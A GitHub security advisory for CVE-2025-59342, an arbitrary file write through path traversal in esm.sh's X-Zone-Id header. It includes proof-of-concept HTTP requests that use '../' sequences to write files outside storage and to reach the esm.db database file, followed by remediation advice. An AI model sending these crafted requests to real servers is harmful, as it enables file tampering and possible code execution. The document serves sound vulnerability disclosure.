# [M] esm.sh has arbitrary file write via path traversal in `X-Zone-Id` header

## Summary
Severity: Medium
Advisory: GHSA-g2h5-cvvr-7gmw
CVE: CVE-2025-59342
CWE: CWE-24
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-09-17
Source: https://github.com/advisories/GHSA-g2h5-cvvr-7gmw
Type: github-advisory

## Affected
- Go: `github.com/esm-dev/esm.sh` — affected >=0 <136.1

## Details
## Summary

A path-traversal flaw in the handling of the `X-Zone-Id` HTTP header allows an attacker to cause the application to write files outside the intended storage location. The header value is used to build a filesystem path but is not properly canonicalized or restricted to the application’s storage base directory. As a result, supplying `../` sequences in `X-Zone-Id` causes files to be written to arbitrary directories (example observed: `~/.esmd/modules/transform/<id>/` instead of `~/.esmd/storage/modules/transform`).

**Severity:** Medium

**Component / Endpoint:** 

`POST /transform` — handling of `X-Zone-Id` header

The vulnerable code is in https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L116 and https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L411 

**Impact:** Arbitrary file creation / overwrite outside intended storage directory (file write to attacker-controlled path). Possible remote code execution, persistence, tampering with application files, or facilitating further path-traversal attacks.

---

## Proof of Concept (POC)

Request (attacker-supplied `X-Zone-Id` contains path traversal):

```
POST /transform HTTP/1.1
Host: localhost:8888
User-Agent: Den/8.7.1
Accept: */*
Connection: keep-alive
Referer: http://localhost:9999/
Content-Type: application/json
X-Zone-Id: ../../modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/
Content-Length: 325

{
  "filename": "example2.js",
  "lang": "js",
  "code": "console.log('hello');",
  "importMap": {
    "imports": {
      "react": "https://esm.sh/react",
      "react-dom": "https://esm.sh/react-dom"
    }
  },
  "jsxImportSource": "react",
  "target": "es2022",
  "sourceMap": "external",
  "minify": true
}
```
<img width="2496" height="1214" alt="Screenshot 2025-09-16 at 21 40 57" src="https://github.com/user-attachments/assets/f878c3f0-5d7d-410c-97ac-20116f5496db" />


Observed result: file written to `~/.esmd/modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/example2.js` instead of the intended `~/.esmd/storage/modules/transform/`.

This can be trigger with another path traversal request below

```
GET /+c245626ef6ca0fd9ee37759c5fac606c6ec99daa./../../../esm.db?.css HTTP/1.1
Host: localhost:8888
User-Agent: localhost
Accept: */*
Connection: keep-alive
X-Zone-Id: ../
Referer: http://localhost:9999/

```
<img width="2516" height="710" alt="Screenshot 2025-09-16 at 21 37 07" src="https://github.com/user-attachments/assets/1fcfbed3-c1d2-4093-82d8-4afda225c685" />

---

## Remediation

Simply remove any .. in the `X-Zone-Id` header before actually process the file.

## Credits

- [Ai Ho (Jessie)](https://github.com/j3ssie)
- [CL Yang](https://github.com/A11riseforme)

## References
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-g2h5-cvvr-7gmw
- https://nvd.nist.gov/vuln/detail/CVE-2025-59342
- https://github.com/esm-dev/esm.sh/commit/833a29f42aeb0acbd7089a71be11dd0a292d3151
- https://github.com/esm-dev/esm.sh
- https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L116
- https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L411
- https://pkg.go.dev/vuln/GO-2025-3967
